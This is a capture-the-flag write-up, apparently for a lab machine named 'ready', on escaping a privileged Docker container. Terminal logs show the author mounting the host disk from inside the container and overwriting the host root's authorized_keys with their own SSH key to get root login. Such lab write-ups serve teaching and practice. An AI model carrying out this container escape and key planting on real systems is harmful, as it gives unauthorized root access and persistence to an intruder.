# Breaking out of docker container
## Check if it is possible to get the privileges to see the host drive
[reference link for escaping docker container](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
Yes, it is possible to get the privileges to see the host drive using `fdisk -l` command on docker container.
```bash
root@gitlab:~# fdisk -l
fdisk -l
Disk /dev/loop0: 55.4 MiB, 58052608 bytes, 113384 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 55.5 MiB, 58159104 bytes, 113592 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop2: 71.3 MiB, 74797056 bytes, 146088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop3: 71.4 MiB, 74907648 bytes, 146304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop4: 31.1 MiB, 32595968 bytes, 63664 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop5: 31.1 MiB, 32571392 bytes, 63616 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
```
## Mounting host drive in the docker container
Mounted host filesystem in the docker container.
```bash
...[snip]...

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
root@gitlab:/# mkdir -p /mnt/hola
mkdir -p /mnt/hola
root@gitlab:/# sudo mount /dev/sda2 /mnt/hola
sudo mount /dev/sda2 /mnt/hola
bash: sudo: command not found
root@gitlab:/# mount /dev/sda2 /mnt/hola
mount /dev/sda2 /mnt/hola
root@gitlab:/# cd /mnt
cd /mnt
root@gitlab:/mnt# ls
ls
clarkey  hola
root@gitlab:/mnt# cd hola
cd hola
root@gitlab:/mnt/hola# ls
ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
```
## Copying kali local vm public ssh key to host filesystem /dev/sda2 
```bash
root@gitlab:/mnt/hola/root# ls -la
ls -la
total 60
drwx------ 10 root root 4096 Dec  7 17:02 .
drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7  2020 .cache
drwx------  3 root root 4096 Jul 11  2020 .config
-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
drwxr-xr-x  3 root root 4096 May  7  2020 .local
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
drwx------  2 root root 4096 Dec  7 16:49 .ssh
drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -> /dev/null
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
root@gitlab:/mnt/hola/root# cd .ssh
cd .ssh
root@gitlab:/mnt/hola/root/.ssh# ls
ls
authorized_keys  id_rsa  id_rsa.pub
root@gitlab:/mnt/hola/root/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi89K9avljGKUu6su01gg8oV19+F+heoQ/qF7cLTjCQvZ/UaJhEe9xTC5mil3Ld0vxN7A0ayT0CZxasyLykh/TjlUbtH2mMtMUUs7WCaZqby+8DRL4/2o3WCOtS4KG8/QE96b6KS7f8+92yCMmeNmeBLCSEtGZr4PeLDCnmQ9LkpS629YucNFbLm4LqmeVObklX6/ofdPR++htRLAFYoIOXv5Z04TNgKxCNEUCsqws5Oe7ODiQ48xdSeA+51OCS3DFfakgwg3T6w53XSX+cyJEdComJPa3Djj+6HXafeHpi0CFbGR+JVGhcNjFM21iZfpVd0af4BPxkUhwQH8TEQAzOC4CaAKUEtmzJDLPwUSZ0mJHDUJawIi33Sn6Ib5Sn9kNqdQe6lUZdJMQHumQ6/N1AqVM3GZwf+0TNtLAtRcUMpg37mr6/ESrzfZkNaEyqh80b2fgGgYEnG2y5C14da3TTVvKrQbO3ezH/VNwLspXskfTd2LZwq4NDBDAUvPJqA0= kali@kali" > authorized_keys
<TVvKrQbO3ezH/VNwLspXskfTd2LZwq4NDBDAUvPJqA0= kali@kali" > authorized_keys
root@gitlab:/mnt/hola/root/.ssh# cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi89K9avljGKUu6su01gg8oV19+F+heoQ/qF7cLTjCQvZ/UaJhEe9xTC5mil3Ld0vxN7A0ayT0CZxasyLykh/TjlUbtH2mMtMUUs7WCaZqby+8DRL4/2o3WCOtS4KG8/QE96b6KS7f8+92yCMmeNmeBLCSEtGZr4PeLDCnmQ9LkpS629YucNFbLm4LqmeVObklX6/ofdPR++htRLAFYoIOXv5Z04TNgKxCNEUCsqws5Oe7ODiQ48xdSeA+51OCS3DFfakgwg3T6w53XSX+cyJEdComJPa3Djj+6HXafeHpi0CFbGR+JVGhcNjFM21iZfpVd0af4BPxkUhwQH8TEQAzOC4CaAKUEtmzJDLPwUSZ0mJHDUJawIi33Sn6Ib5Sn9kNqdQe6lUZdJMQHumQ6/N1AqVM3GZwf+0TNtLAtRcUMpg37mr6/ESrzfZkNaEyqh80b2fgGgYEnG2y5C14da3TTVvKrQbO3ezH/VNwLspXskfTd2LZwq4NDBDAUvPJqA0= kali@kali
```
## Getting ssh shell as root on ready machine
![[Pasted image 20210412064222.png]]
## Got root.txt flag
![[Pasted image 20210412064313.png]]


